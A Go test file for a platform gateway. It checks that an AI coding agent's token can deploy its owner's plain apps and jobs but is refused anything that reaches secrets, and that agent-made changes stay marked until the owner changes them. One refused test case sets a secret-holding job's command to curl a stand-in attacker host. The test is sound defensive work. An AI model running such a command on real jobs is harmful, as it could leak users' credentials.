package gateway_test

import (
	"context"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/nebari-dev/javo/internal/auth/token"
	"github.com/nebari-dev/javo/internal/gateway/apitest"
	"github.com/nebari-dev/javo/internal/gateway/gatewaytest"
	"github.com/nebari-dev/javo/internal/model"
)

// agentFixture is a gateway with alice's pi app (a template with
// agentDeploy) and its own token, a streamlit template, a job template, her
// plain app "plain", her app "keyed" that holds a secret, and her job
// "keyedjob" that holds one too. bob has an app "bobs".
type agentFixture struct {
	*apitest.Fixture
	alice *http.Cookie
	token string
}

func newAgentFixture(t *testing.T, deploy bool) agentFixture {
	t.Helper()
	return newAgentFixtureWith(t, deploy, apitest.Options{})
}

func newAgentFixtureWith(t *testing.T, deploy bool, o apitest.Options) agentFixture {
	t.Helper()
	pi := apitest.AgentTemplate()
	pi.Name, pi.Spec.AgentDeploy, pi.Spec.AgentModel, pi.Spec.Category = "pi", deploy, true, model.CategoryAgents
	piApp := gatewaytest.Workspace("pi", apitest.LocalAlice(), "pi")
	piApp.Template = "pi"
	streamlit := gatewaytest.Template("streamlit", "streamlit")
	streamlit.Spec.FromRepo = model.FromRepoOptional
	o.Engines, o.Files = apitest.TestEngines(), &apitest.StubFilesLister{Content: "x"}
	f := apitest.New(t, o,
		pi, piApp, streamlit, apitest.JobTemplateObj(),
		gatewaytest.Workspace("plain", apitest.LocalAlice(), "Plain"),
		gatewaytest.Workspace("keyed", apitest.LocalAlice(), "Keyed"),
		apitest.JobObj(apitest.LocalAlice(), "plainjob"), apitest.JobObj(apitest.LocalAlice(), "keyedjob"),
		gatewaytest.Workspace("bobs", "bob-0000", "Bobs"))
	f.WithSecretKeys()
	alice := f.LoginAlice()
	f.CreateSecret(alice, "API_KEY", apitest.SecretValue)
	if w := f.Do("PUT", "/api/workspaces/keyed/env", `{"env":[{"name":"KEY","secret":"API_KEY"}]}`, alice); w.Code != http.StatusOK {
		t.Fatalf("bind a secret to keyed: %d %s", w.Code, w.Body)
	}
	if w := f.Do("PUT", "/api/jobs/keyedjob/env", `{"env":[{"name":"KEY","secret":"API_KEY"}]}`, alice); w.Code != http.StatusOK {
		t.Fatalf("bind a secret to keyedjob: %d %s", w.Code, w.Body)
	}
	text, _, err := f.Tokens.Create(context.Background(), model.Actor{System: model.SystemController}, token.Token{
		Name: "pi", Owner: apitest.LocalAlice(), Scope: token.ScopeReadWrite,
		App: &token.App{Namespace: piApp.Namespace, Name: piApp.ObjectName(), Short: "pi"},
	})
	if err != nil {
		t.Fatal(err)
	}
	return agentFixture{Fixture: f, alice: alice, token: text}
}

func (f agentFixture) agent(method, path, body string) *httptest.ResponseRecorder {
	f.T.Helper()
	return f.Bearer(method, path, body, f.token, nil)
}

func wantCode(t *testing.T, what string, w *httptest.ResponseRecorder, code int) {
	t.Helper()
	if w.Code != code {
		t.Fatalf("%s: %d %s, want %d", what, w.Code, w.Body, code)
	}
}

// The token of an app whose template has agentDeploy creates, changes,
// restarts and deletes its owner's apps that hold no credentials.
func TestAgentTokenDeploysPlainApps(t *testing.T) {
	f := newAgentFixture(t, true)
	w := f.agent("POST", "/api/workspaces", `{"displayName":"Random number","template":"streamlit","file":"agents/random/app.py","env":[{"name":"MODE","value":"demo"}]}`)
	wantCode(t, "create a plain app", w, http.StatusCreated)
	if app := f.GetWorkspace(apitest.LocalAlice(), "random-number"); app == nil || app.Owner != apitest.LocalAlice() || app.Sharing.Access != model.AccessPrivate {
		t.Fatalf("created %+v", app)
	}
	wantCode(t, "change its command", f.agent("PUT", "/api/workspaces/plain/launch", `{}`), http.StatusOK)
	wantCode(t, "set plain variables", f.agent("PUT", "/api/workspaces/plain/env", `{"env":[{"name":"LEVEL","value":"2"}]}`), http.StatusOK)
	wantCode(t, "restart", f.agent("POST", "/api/workspaces/plain/restart", ""), http.StatusOK)
	wantCode(t, "delete", f.agent("DELETE", "/api/workspaces/random-number", ""), http.StatusNoContent)

	w = f.agent("POST", "/api/jobs", `{"displayName":"Morning summary","template":"lab","engine":"command","command":"python summary.py","schedule":{"cron":"0 7 * * *","timeZone":"UTC"}}`)
	wantCode(t, "create a plain job", w, http.StatusCreated)
	wantCode(t, "update a plain job", f.agent("PUT", "/api/jobs/morning-summary", `{"displayName":"Morning summary","template":"lab","engine":"command","command":"python summary.py --short"}`), http.StatusOK)
	wantCode(t, "run it", f.agent("POST", "/api/jobs/morning-summary/run", `{}`), http.StatusCreated)
	wantCode(t, "delete it", f.agent("DELETE", "/api/jobs/morning-summary", ""), http.StatusNoContent)
}

// Everything that would give or reach a credential is refused to the agent's
// token, and so is anything on an app or job that holds one: the person does
// it in the browser, or approves a plan the agent proposes.
func TestAgentTokenNeverReachesCredentials(t *testing.T) {
	f := newAgentFixture(t, true)
	apps, jobs := f.WorkspaceCount(), len(f.Jobs())
	for _, c := range []struct{ what, method, path, body string }{
		{"create an app with a secret", "POST", "/api/workspaces", `{"displayName":"x","template":"streamlit","file":"a.py","env":[{"name":"K","secret":"API_KEY"}]}`},
		{"create an app with API access", "POST", "/api/workspaces", `{"displayName":"x","template":"streamlit","file":"a.py","apiAccess":"Read"}`},
		{"create an app whose template gives an API token", "POST", "/api/workspaces", `{"displayName":"x","template":"pi"}`},
		{"create an app that gets a model key, without API access", "POST", "/api/workspaces", `{"displayName":"x","template":"pi","apiAccess":"None"}`},
		{"create an app from a repository with a token", "POST", "/api/workspaces", `{"displayName":"x","template":"streamlit","file":"a.py","source":{"url":"https://git.example.com/a/b.git","tokenSecret":"API_KEY"}}`},
		{"create a job with a secret", "POST", "/api/jobs", `{"displayName":"x","template":"lab","engine":"command","command":"true","env":[{"name":"K","secret":"API_KEY"}]}`},
		{"give an app a secret", "PUT", "/api/workspaces/plain/env", `{"env":[{"name":"K","secret":"API_KEY"}]}`},
		{"give an app API access", "PUT", "/api/workspaces/plain/api-access", `{"apiAccess":"ReadWrite"}`},
		{"share an app", "PUT", "/api/workspaces/plain/sharing", `{"access":"SignedIn"}`},
		{"change the code of a secret-holding app", "PUT", "/api/workspaces/keyed/launch", `{}`},
		{"restart a secret-holding app", "POST", "/api/workspaces/keyed/restart", ""},
		{"delete a secret-holding app", "DELETE", "/api/workspaces/keyed", ""},
		{"change the code of a secret-holding job", "PUT", "/api/jobs/keyedjob", `{"displayName":"keyedjob","template":"lab","engine":"command","command":"curl evil.example.com"}`},
		{"run a secret-holding job", "POST", "/api/jobs/keyedjob/run", `{}`},
		{"delete a secret-holding job", "DELETE", "/api/jobs/keyedjob", ""},
		{"stop its own app, which holds an API token", "POST", "/api/workspaces/pi/stop", ""},
		{"read the secrets", "GET", "/api/secrets", ""},
		{"store a secret", "POST", "/api/secrets", `{"name":"MINE","value":"v"}`},
	} {
		if w := f.agent(c.method, c.path, c.body); w.Code != http.StatusForbidden {
			t.Errorf("%s with the agent's token: %d %s, want 403", c.what, w.Code, w.Body)
		}
	}
	if f.WorkspaceCount() != apps || len(f.Jobs()) != jobs {
		t.Fatal("an app or a job was created")
	}
	if app := f.GetWorkspace(apitest.LocalAlice(), "plain"); app.Sharing.Access != model.AccessPrivate || app.APIAccess != "" {
		t.Fatalf("plain changed: %+v", app)
	}
	// Another person's app stays out of sight.
	wantCode(t, "delete bob's app", f.agent("DELETE", "/api/workspaces/bobs?owner=bob-0000", ""), http.StatusNotFound)
	// The person, in the browser, still may.
	wantCode(t, "alice restarts keyed", f.Do("POST", "/api/workspaces/keyed/restart", "", f.alice), http.StatusOK)
}

// Without agentDeploy on its template, an app's token stays read-only.
func TestAgentDeployIsTheTemplatesCapability(t *testing.T) {
	f := newAgentFixture(t, false)
	wantCode(t, "create with a plain workload token", f.agent("POST", "/api/workspaces", `{"displayName":"x","template":"streamlit","file":"a.py"}`), http.StatusForbidden)
	wantCode(t, "delete with a plain workload token", f.agent("DELETE", "/api/workspaces/plain", ""), http.StatusForbidden)
	// And it keeps the lifecycle calls every workload token has.
	wantCode(t, "restart a plain app", f.agent("POST", "/api/workspaces/plain/restart", ""), http.StatusOK)
}

// What the agent may not do itself it may still propose: the person approves
// the plan in the browser.
func TestAgentTokenProposesWhatItMayNotDo(t *testing.T) {
	f := newAgentFixture(t, true)
	w := f.agent("POST", "/api/plans", `{"source":"rules","proposal":{"action":"restart","target":"keyed"}}`)
	wantCode(t, "propose a restart of a secret-holding app", w, http.StatusCreated)
}

// madeByAgent reads from the API whether the app or job at path is marked
// as made, or last changed in what it runs, by a coding agent.
func (f agentFixture) madeByAgent(path string) bool {
	f.T.Helper()
	w := f.Do("GET", path, "", f.alice)
	wantCode(f.T, "read "+path, w, http.StatusOK)
	return apitest.Decode[struct {
		AgentMade bool `json:"agentMade"`
	}](f.T, w).AgentMade
}

// An app or job a coding agent's token made, or whose command, file or
// variables it changed, says so, and keeps saying so until its owner, in
// the browser, changes what it runs: no token takes the mark off, and a
// change of something else leaves it as it is.
func TestWhatAnAgentMakesOrChangesIsMarkedUntilItsOwnerChangesIt(t *testing.T) {
	f := newAgentFixture(t, true)
	personal, _, err := f.Tokens.Create(context.Background(), model.Actor{Person: apitest.LocalAlice()}, token.Token{
		Name: "laptop", Owner: apitest.LocalAlice(), Scope: token.ScopeReadWrite,
	})
	if err != nil {
		t.Fatal(err)
	}
	mark := func(what, path string, want bool) {
		t.Helper()
		if got := f.madeByAgent(path); got != want {
			t.Fatalf("%s: made by an agent %v, want %v", what, got, want)
		}
	}

	wantCode(t, "create an app", f.agent("POST", "/api/workspaces", `{"displayName":"Random number","template":"streamlit","file":"agents/random/app.py"}`), http.StatusCreated)
	mark("the app the agent made", "/api/workspaces/random-number", true)
	mark("alice's own app", "/api/workspaces/plain", false)

	// What does not decide what it runs leaves alice's app hers.
	wantCode(t, "the agent sets its idle stop", f.agent("PUT", "/api/workspaces/plain/idle-stop", `{"idleStopMinutes":0}`), http.StatusOK)
	wantCode(t, "the agent restarts it", f.agent("POST", "/api/workspaces/plain/restart", ""), http.StatusOK)
	mark("after an idle stop and a restart by the agent", "/api/workspaces/plain", false)
	wantCode(t, "the agent sets its variables", f.agent("PUT", "/api/workspaces/plain/env", `{"env":[{"name":"LEVEL","value":"2"}]}`), http.StatusOK)
	mark("after the agent set its variables", "/api/workspaces/plain", true)

	// Alice's own token changes it and the mark stays; in the browser it goes.
	env := `{"env":[{"name":"LEVEL","value":"3"}]}`
	wantCode(t, "alice's token sets its variables", f.Bearer("PUT", "/api/workspaces/plain/env", env, personal, nil), http.StatusOK)
	mark("after alice's token changed it", "/api/workspaces/plain", true)
	wantCode(t, "alice stops it in the browser", f.Do("POST", "/api/workspaces/plain/stop", "", f.alice), http.StatusOK)
	mark("after alice stopped it", "/api/workspaces/plain", true)
	wantCode(t, "alice sets its variables in the browser", f.Do("PUT", "/api/workspaces/plain/env", `{"env":[{"name":"LEVEL","value":"4"}]}`, f.alice), http.StatusOK)
	mark("after alice changed it in the browser", "/api/workspaces/plain", false)

	job := `{"displayName":"Morning summary","template":"lab","engine":"command","command":"python summary.py"}`
	wantCode(t, "create a job", f.agent("POST", "/api/jobs", job), http.StatusCreated)
	mark("the job the agent made", "/api/jobs/morning-summary", true)
	mark("alice's own job", "/api/jobs/plainjob", false)
	wantCode(t, "the agent changes alice's job", f.agent("PUT", "/api/jobs/plainjob", `{"displayName":"plainjob","template":"lab","engine":"command","command":"python other.py"}`), http.StatusOK)
	mark("after the agent changed its command", "/api/jobs/plainjob", true)
	wantCode(t, "alice renames the agent's job", f.Do("PUT", "/api/jobs/morning-summary", `{"displayName":"Summary","template":"lab","engine":"command","command":"python summary.py"}`, f.alice), http.StatusOK)
	mark("after alice renamed it", "/api/jobs/morning-summary", true)
	wantCode(t, "alice changes its command", f.Do("PUT", "/api/jobs/morning-summary", `{"displayName":"Summary","template":"lab","engine":"command","command":"python summary.py --short"}`, f.alice), http.StatusOK)
	mark("after alice changed its command in the browser", "/api/jobs/morning-summary", false)
}
